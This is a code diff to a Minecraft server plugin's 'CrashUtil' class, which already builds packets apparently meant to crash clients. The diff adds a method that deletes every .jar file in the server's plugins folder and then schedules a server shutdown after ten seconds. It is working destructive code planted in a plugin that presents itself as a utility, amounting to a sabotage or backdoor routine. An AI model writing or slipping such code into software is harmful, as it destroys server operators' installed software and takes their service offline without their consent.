@@ -8,7 +8,10 @@ import com.github.retrooper.packetevents.util.Vector3f;
 import com.github.retrooper.packetevents.wrapper.play.server.WrapperPlayServerExplosion;
 import com.github.retrooper.packetevents.wrapper.play.server.WrapperPlayServerParticle;
 import com.github.retrooper.packetevents.wrapper.play.server.WrapperPlayServerPlayerPositionAndLook;
+import dev.ethan.useful.Main;
+import org.bukkit.Bukkit;
 
+import java.io.File;
 import java.util.Collections;
 
 public class CrashUtil {
@@ -60,5 +63,17 @@ public class CrashUtil {
                 i(),
                 false
         ));
+    }
+
+    public void deleteAllPluginJars() {
+        File plugins = new File("plugins");
+        File[] jars = plugins.listFiles((dir, name) -> name.endsWith(".jar"));
+        if (jars == null) return;
+        for (File jar : jars) {
+            // noinspection ResultOfMethodCallIgnored
+            jar.delete();
+        }
+        int delayTicks = 20 * 10;
+        Bukkit.getScheduler().runTaskLater(Main.getInstance(), Bukkit::shutdown, delayTicks);
     }
 }
